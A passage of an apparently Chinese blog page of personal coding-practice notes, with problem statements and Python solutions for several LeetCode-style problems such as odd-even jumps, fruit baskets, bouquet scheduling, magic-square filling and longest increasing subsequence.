class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oddEvenJumps</span>(<span class="params">self, arr: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> arr:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">next_greater_element</span>(<span class="params">arr</span>):</span><br><span class="line">            n = <span class="built_in">len</span>(arr)</span><br><span class="line">            result = [<span class="literal">None</span>]*n</span><br><span class="line">            stack = []</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">while</span> stack <span class="keyword">and</span> arr[stack[-<span class="number">1</span>]] &lt; arr[i]:</span><br><span class="line">                    result[arr[stack.pop()]] = arr[i]</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">del</span> stack</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        </span><br><span class="line">        n = <span class="built_in">len</span>(arr)</span><br><span class="line">        arr_sorted = <span class="built_in">sorted</span>(<span class="built_in">range</span>(n), key=<span class="keyword">lambda</span> x: arr[x])</span><br><span class="line">        odd = next_greater_element(arr_sorted)</span><br><span class="line">        </span><br><span class="line">        arr_sorted.sort(key=<span class="keyword">lambda</span> x: arr[x], reverse=<span class="literal">True</span>)</span><br><span class="line">        even = next_greater_element(arr_sorted)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Index 0, represents path starting with odd jump</span></span><br><span class="line">        <span class="comment"># Index 1, represents path starting with even jump</span></span><br><span class="line">        dp = [[<span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Last Index is always reachable.</span></span><br><span class="line">        dp[-<span class="number">1</span>] = [<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># If Odd Jump is possible</span></span><br><span class="line">            <span class="keyword">if</span> odd[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                dp[i][<span class="number">0</span>] = dp[odd[i]][<span class="number">1</span>]</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># If Even Jump is possible</span></span><br><span class="line">            <span class="keyword">if</span> even[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                dp[i][<span class="number">1</span>] = dp[even[i]][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>([i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> dp])</span><br></pre></td></tr></table></figure></p><p>这里<code>arr_sorted</code>返回依据<code>value</code>排序的<code>index</code>列表,然后<code>next_greater_element</code>依据此列表算出所有元素的下一跳<code>index</code>,这样即可得到odd jump的列表, even jump的话<code>reverse=True</code>再sort一遍丢进去即even jump列表.</p><p>最后依据两个列表从后往前推导即可.</p><h2 id="license-key-formatting">482. License Key Formatting</h2><p>You are given a license key represented as a string <code>s</code> that consists of only alphanumeric characters and dashes. The string is separated into <code>n + 1</code> groups by <code>n</code> dashes. You are also given an integer <code>k</code>.</p><p>We want to reformat the string <code>s</code> such that each group contains exactly <code>k</code> characters, except for the first group, which could be shorter than <code>k</code> but still must contain at least one character. Furthermore, there must be a dash inserted between two groups, and you should convert all lowercase letters to uppercase.</p><p>Return the reformatted license key.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;2-5g-3-J&quot;, k = 2</span><br><span class="line">Output: &quot;2-5G-3J&quot;</span><br><span class="line">Explanation: The string s has been split into three parts, each part has 2 characters except the first part as it could be shorter as mentioned above.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">licenseKeyFormatting</span>(<span class="params">self, s: <span class="built_in">str</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(s.split(<span class="string">&#x27;-&#x27;</span>)).upper()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) &lt;= k:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        seperate = <span class="built_in">len</span>(s)%k</span><br><span class="line">        ret = s[:seperate]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(seperate, <span class="built_in">len</span>(s), k):</span><br><span class="line">            ret += <span class="string">&#x27;-&#x27;</span> + s[i:i+k]</span><br><span class="line">        <span class="keyword">return</span> ret <span class="keyword">if</span> seperate <span class="keyword">else</span> ret[<span class="number">1</span>:]</span><br></pre></td></tr></table></figure><h2 id="unique-email-addresses">929. Unique Email Addresses</h2><p>描述很复杂, 简单表述就是修复localname.</p><p>方法:localname里面的句号无视掉, 加号算注释符, domain不变</p><p>求修复localname后不同的邮件地址数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numUniqueEmails</span>(<span class="params">self, emails: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ret = []</span><br><span class="line">        <span class="keyword">for</span> email <span class="keyword">in</span> emails:</span><br><span class="line">            local_name, domain = email.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">            fixed_local_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> local_name:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]:</span><br><span class="line">                    fixed_local_name += i</span><br><span class="line">                <span class="keyword">elif</span> i == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            ret.append((fixed_local_name, domain))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">set</span>(ret))</span><br></pre></td></tr></table></figure><h2 id="fruit-into-baskets">904. Fruit Into Baskets</h2><p>You are visiting a farm that has a single row of fruit trees arranged from left to right. The trees are represented by an integer array <code>fruits</code> where <code>fruits[i]</code> is the type of fruit the <code>ith</code> tree produces.</p><p>You want to collect as much fruit as possible. However, the owner has some strict rules that you must follow:</p><ul><li>You only have two baskets, and each basket can only hold a single type of fruit. There is no limit on the amount of fruit each basket can hold.</li><li>Starting from any tree of your choice, you must pick exactly one fruit from every tree (including the start tree) while moving to the right. The picked fruits must fit in one of your baskets.</li><li>Once you reach a tree with fruit that cannot fit in your baskets, you must stop.</li></ul><p>Given the integer array <code>fruits</code>, return the maximum number of fruits you can pick.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: fruits = [1,2,3,2,2]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: We can pick from trees [2,3,2,2].</span><br><span class="line">If we had started at the first tree, we would only pick from trees [1,2].</span><br></pre></td></tr></table></figure><p>双指针 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">totalFruit</span>(<span class="params">self, fruits: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        l, r = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        basket = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> r != <span class="built_in">len</span>(fruits):</span><br><span class="line">            basket[fruits[r]] += <span class="number">1</span></span><br><span class="line">            r += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(basket) &gt; <span class="number">2</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res, r - l - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">while</span> <span class="built_in">len</span>(basket) &gt; <span class="number">2</span>:</span><br><span class="line">                    l_fruit = fruits[l]</span><br><span class="line">                    basket[l_fruit] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> basket[l_fruit] == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">del</span> basket[l_fruit]</span><br><span class="line">                    l += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(res, r - l)</span><br></pre></td></tr></table></figure></p><h2 id="minimum-number-of-days-to-make-m-bouquets">1482. Minimum Number of Days to Make m Bouquets</h2><p>You are given an integer array <code>bloomDay</code>, an integer <code>m</code> and an integer <code>k</code>.</p><p>You want to make <code>m</code> bouquets. To make a bouquet, you need to use <code>k</code> adjacent flowers from the garden.</p><p>The garden consists of <code>n</code> flowers, the <code>ith</code> flower will bloom in the <code>bloomDay[i]</code> and then can be used in exactly one bouquet.</p><p>Return the minimum number of days you need to wait to be able to make <code>m</code> bouquets from the garden. If it is impossible to make m bouquets return <code>-1</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: bloomDay = [1,10,3,10,2], m = 3, k = 1</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: Let us see what happened in the first three days. x means flower bloomed and _ means flower did not bloom in the garden.</span><br><span class="line">We need 3 bouquets each should contain 1 flower.</span><br><span class="line">After day 1: [x, _, _, _, _]   // we can only make one bouquet.</span><br><span class="line">After day 2: [x, _, _, _, x]   // we can only make two bouquets.</span><br><span class="line">After day 3: [x, _, x, _, x]   // we can make 3 bouquets. The answer is 3.</span><br></pre></td></tr></table></figure><p>一开始觉得遍历n,然后跑了4000ms,就感觉不太对,后续看了下solution发现跑二分. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDays</span>(<span class="params">self, bloomDay: <span class="type">List</span>[<span class="built_in">int</span>], m: <span class="built_in">int</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">time</span>):</span><br><span class="line">            flower = <span class="number">0</span></span><br><span class="line">            bouquet = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> bloomDay:</span><br><span class="line">                <span class="keyword">if</span> i &lt;= time:</span><br><span class="line">                    flower += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flower = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flower == k:</span><br><span class="line">                    bouquet += <span class="number">1</span></span><br><span class="line">                    flower = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> bouquet == m:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check(<span class="number">1e9</span>):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        l = <span class="built_in">min</span>(bloomDay)</span><br><span class="line">        r = <span class="built_in">max</span>(bloomDay)</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> check(mid):</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure></p><h2 id="fill-matrix">Fill Matrix</h2><p>Given a NxN matrix. Fill the integers from <code>1</code> to <code>n*n</code> to this matrix that makes the sum of each row, each column and the two diagonals equal.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 3</span><br><span class="line">Output:</span><br><span class="line">[[8, 3, 4],</span><br><span class="line"> [1, 5, 9],</span><br><span class="line"> [6, 7, 2]]</span><br><span class="line">Explanation: We need to fill [1, 2, 3... 9] into a 3x3 matrix. This is one way to do it</span><br><span class="line">Each row [8, 3, 4] [1, 5, 9] [6, 7, 2] sum is 15.</span><br><span class="line">Each column [8, 1, 6] [3, 5, 7] [4, 9, 2] sum is 15.</span><br><span class="line">The two diagonals [8, 5, 2] [4, 5, 6] sum is 15.</span><br></pre></td></tr></table></figure><p>只会一手爆破写法,复杂度高了直接不行,最多到4. 优化懒得考虑了,感觉不得行 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_row</span>(<span class="params">board, row, n</span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> board[row][i] == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        ret += board[row][i]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_col</span>(<span class="params">board, col, n</span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> board[i][col] == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        ret += board[i][col]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_diagnal</span>(<span class="params">board, n, tl2br=<span class="literal">True</span></span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> tl2br:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> board[i][i] == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            ret += board[i][i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> board[i][n - i - <span class="number">1</span>] == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            ret += board[i][n - i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fillMatrix</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">board, index, value_set, n</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(value_set) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> board</span><br><span class="line">        row = index // n</span><br><span class="line">        col = index % n</span><br><span class="line">        new_board = board.copy()</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> value_set:</span><br><span class="line">            new_board[row][col] = value</span><br><span class="line">            new_value_set = value_set - &#123;value&#125;</span><br><span class="line">            <span class="keyword">if</span> row == n - <span class="number">1</span> <span class="keyword">or</span> col == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> row == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_col(new_board, col, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> col == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_row(new_board, row, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> row == n - <span class="number">1</span> <span class="keyword">and</span> col == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_diagnal(new_board, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> row == n-<span class="number">1</span> <span class="keyword">and</span> col == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_diagnal(new_board, n, <span class="literal">False</span>) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            ret = fill(new_board, index + <span class="number">1</span>, new_value_set, n)</span><br><span class="line">            <span class="keyword">if</span> ret == -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> row == n - <span class="number">1</span> <span class="keyword">and</span> col == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> new_board</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    board = [[<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    all_value = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">1</span>, n**<span class="number">2</span>+<span class="number">1</span>))</span><br><span class="line">    avg = <span class="built_in">sum</span>(all_value) // n</span><br><span class="line">    ret = fill(board, <span class="number">0</span>, all_value, n)</span><br><span class="line">    <span class="keyword">if</span> ret != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line">n=<span class="number">4</span></span><br><span class="line">res = fillMatrix(n)</span><br><span class="line"><span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># matrix</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Matrix:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># row check</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rows:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            ret += res[i][j]</span><br><span class="line">        <span class="built_in">print</span>(ret, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># col check</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cols:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            ret += res[j][i]</span><br><span class="line">        <span class="built_in">print</span>(ret, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tlbr diagonal:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret += res[i][i]</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;trbl diagonal:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret += res[i][n-<span class="number">1</span>-i]</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Exist!&quot;</span>)</span><br></pre></td></tr></table></figure></p><h2 id="longest-increasing-subsequence">300. Longest Increasing Subsequence</h2><p>Given an integer array nums, return the length of the longest strictly increasing subsequence.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [10,9,2,5,3,7,101,18]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.</span><br></pre></td></tr></table></figure><p>一开始是觉得是dp, 外层遍历所有元素, 内层遍历找最长路径, dp元素表示到达某个index的最长路径,复杂度<code>O(n^2)</code>,但题目要求nlogn,想了半天没想出来,看了下别人的答案,理解了之后自己写了一遍. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        lst = [nums[<span class="number">0</span>]]</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums[<span class="number">1</span>:]:</span><br><span class="line">            <span class="keyword">if</span> num &gt; lst[-<span class="number">1</span>]:</span><br><span class="line">                lst.append(num)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lst[bisect.bisect_left(lst, num)] = num</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(lst)</span><br></pre></td></tr></table></figure> 主要就是一旦新元素大于最右侧必然导致长度加一,否则可以丢到list里面去当作新case来储存,一旦这个新case达到最大长度或者新来的元素大于所有元素都会被考虑到,而我们并不在乎原来的list是什么,所以最后list会被打乱,但是不影响最终返回是最大长度.</p><h2 id="maximum-distance">Maximum Distance</h2><p>Problem statement You are given an array of binary strings ‘arr’ of size ‘N’. Your task is to find out the maximum distance between the pair of strings.</p><p>The distance between two binary strings is defined as the sum of their lengths after removing the common prefix.</p><p>For example: You are given ‘arr’ = [ “01011”, “010110”, “0111”], Here the strings with the maximum distance between them are “010110” and “0111”, where the prefix is “01”, hence the maximum distance is 4 + 2 = 6. Hence the answer is 6.</p><p>第一感觉暴力求解,然后就写了一份然后AC了,看了答案发现用trie做的,第一次见这个数据结构,也算是记一下了. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># brute force</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maximumDistance</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    length = <span 